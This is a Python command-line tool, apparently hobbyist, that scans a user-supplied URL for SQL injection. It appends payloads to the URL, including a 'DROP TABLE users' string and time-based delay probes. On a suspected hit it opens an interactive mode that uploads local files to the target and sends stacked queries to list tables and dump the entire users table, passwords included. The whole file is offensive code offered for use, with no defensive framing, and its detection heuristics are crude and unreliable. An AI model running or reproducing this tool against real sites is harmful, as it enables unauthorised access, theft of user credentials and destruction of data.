import requests
import time
import argparse
from bs4 import BeautifulSoup
from urllib.parse import urljoin
from colorama import Fore, Style, init
from datetime import datetime

# Initialize colorama
init()

# Function to print the banner
def banner():
    # Colors from colorama
    yellow = Fore.YELLOW
    red = Fore.RED
    reset = Style.RESET_ALL

    syringe = f"""
       {yellow}_____{reset}
       {yellow}__H__{reset}
        ["]
        [)] 
        [)] {red}
        |V.{reset}
    """
    print(syringe)

# List of payloads for basic SQL injection tests
PAYLOADS = [
    "' OR 1=1 --",
    "' OR 'a'='a",
    "'; DROP TABLE users; --",
    "' UNION SELECT NULL, NULL --",
    "'; WAITFOR DELAY '0:0:5' --",  # Time-based payload for SQL Server
    "' AND SLEEP(5) --",  # Time-based payload for MySQL
]

# Function to print time with INFO label in the desired colors
def print_info(message):
    current_time = datetime.now().strftime("%H:%M:%S")
    print(f"{Fore.BLUE}[{current_time}]{Fore.YELLOW} [INFO] {Style.RESET_ALL}{message}")

# Function to perform a basic SQL injection test
def test_sqli(url, payload):
    try:
        print_info(f"Testing payload: {payload}")
        # Test with the payload appended to the URL
        response = requests.get(url + payload)
        
        # Check for response status or any indications of SQL injection
        if "error" in response.text.lower():
            print(f"Potential SQLi found using payload: {payload}")
            print(f"Response: {response.text[:200]}")  # Print the first 200 chars of response for context
        elif payload in response.url:
            print(f"Possible blind SQLi or URL injection: {payload}")
            return True
    except Exception as e:
        print(f"Error with the request: {e}")
    return False

# Function for time-based SQL injection testing (useful for Blind SQLi)
def time_based_sqli(url, payload, delay=5):
    try:
        print_info(f"Testing time-based payload: {payload}")
        start_time = time.time()
        response = requests.get(url + payload)
        elapsed_time = time.time() - start_time
        
        # If there's a noticeable delay, it's likely a time-based SQLi
        if elapsed_time > delay:
            print(f"Time-based SQLi detected: Payload caused delay of {elapsed_time:.2f}s")
            print(f"Response: {response.text[:200]}")
            return True
    except Exception as e:
        print(f"Error with the request: {e}")
    return False

# Function to interact with the database (real execution)
def interact_with_db(url):
    print("\nWelcome to the server! You have successfully accessed the database.")
    
    while True:
        command = input("Enter 'upload' to upload a file or 'dump' to dump database info: ").strip().lower()

        if command == 'upload':
            # Real file upload: This assumes an application vulnerability exists to upload files
            file_to_upload = input("Enter file path to upload: ").strip()

            # Prepare file upload (this depends on the web application's vulnerability)
            with open(file_to_upload, 'rb') as file:
                files = {'file': (file.name, file, 'multipart/form-data')}
                response = requests.post(url, files=files)

            print(f"Uploading file {file_to_upload}... Response: {response.status_code}")
            if response.status_code == 200:
                print("File uploaded successfully!")
            else:
                print("Failed to upload the file.")

        elif command == 'dump':
            # Real database dumping: Perform SQL queries to dump database information
            print("Dumping database information...")
            # Querying tables in the database
            dump_tables(url)
        else:
            print("Invalid command! Please enter 'upload' or 'dump'.")

# Function to dump database tables and user information
def dump_tables(url):
    # Example queries for dumping database tables and user info (real database interaction needed)
    print("Retrieving database tables...")

    # SQL queries for database information (adjust for actual database being used)
    queries = [
        "SELECT table_name FROM information_schema.tables;",  # List all tables
        "SELECT column_name FROM information_schema.columns WHERE table_name='users';",  # List columns in 'users' table
        "SELECT * FROM users;",  # Dump all user information (e.g., usernames, passwords)
    ]

    for query in queries:
        print_info(f"Executing query: {query}")
        # Send the SQL query via SQLi (assuming the URL is vulnerable)
        payload = f"'; {query} --"
        response = requests.get(url + payload)

        # Print the results of the SQL query
        print(f"Response: {response.text[:200]}...")  # Limit output for readability

# Function to find form inputs in the HTML page using BeautifulSoup
def find_form_inputs(url):
    try:
        response = requests.get(url)
        soup = BeautifulSoup(response.text, 'html.parser')

        # Find all form inputs and links
        forms = soup.find_all('form')
        inputs = soup.find_all('input')
        links = soup.find_all('a', href=True)

        print("\nFound forms and input parameters:")
        for form in forms:
            print(f"Form: {form.get('action')}")
            for input_tag in form.find_all('input'):
                input_name = input_tag.get('name')
                if input_name:
                    print(f"  - Input field: {input_name}")

        print("\nFound links (possible injection points):")
        for link in links:
            href = link.get('href')
            absolute_url = urljoin(url, href)
            print(f"  - Link: {absolute_url}")
            
        return inputs, links

    except Exception as e:
        print(f"Error finding forms and links: {e}")
        return [], []

# Main function to scan the URL
def scan_url(url):
    print_info(f"Scanning URL: {url}")
    
    # Test each payload on the URL
    for payload in PAYLOADS:
        if test_sqli(url, payload) or time_based_sqli(url, payload):
            # If an SQL injection is found, interact with the database
            interact_with_db(url)
            return

    print_info("No SQL injection vulnerabilities found.")

# Set up argparse for command-line arguments
def main():
    # Print the banner at the start of the script
    banner()

    parser = argparse.ArgumentParser(description="SQL Injection Scanner with Database Interaction")
    parser.add_argument("-u", "--url", required=True, help="The target URL to scan for SQL injection")
    args = parser.parse_args()

    # Scan the URL specified by the user
    scan_url(args.url)

# Entry point for the script
if __name__ == "__main__":
    main()
